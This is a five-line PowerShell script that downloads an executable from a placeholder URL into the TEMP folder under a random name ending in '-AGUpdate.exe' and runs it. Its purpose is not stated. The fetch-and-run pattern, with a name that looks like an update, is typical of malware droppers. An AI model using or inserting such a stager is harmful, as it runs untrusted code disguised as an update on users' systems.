$url = "DirectLink"
$randomFileName = [System.IO.Path]::GetRandomFileName()
$tempFilePath = Join-Path -Path $env:TEMP -ChildPath "$randomFileName-AGUpdate.exe"
Invoke-WebRequest -Uri $url -OutFile $tempFilePath
Start-Process -FilePath $tempFilePath -Wait
